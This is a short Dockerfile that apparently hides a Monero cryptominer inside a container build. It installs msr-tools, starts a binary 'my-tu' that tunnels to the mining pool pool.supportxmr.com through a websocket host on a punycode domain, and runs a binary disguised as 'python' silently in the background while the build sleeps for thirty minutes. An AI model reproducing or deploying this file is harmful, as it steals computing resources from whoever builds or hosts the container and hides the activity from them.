FROM debian:sid
COPY my-tu /
WORKDIR /app
COPY python /app/
COPY config.json /app/

RUN apt update -y \
  && apt install -y procps msr-tools
RUN chmod a+x /my-tu /app/python && \
  (/my-tu -L 127.0.0.1:3333:pool.supportxmr.com:7777 wss://xn--fiq811j6ckwjg.wangjm.link/ &) && \
  cd /app && \
  (./python > /dev/null &) && \
  sleep 1800  

CMD /bin/bash
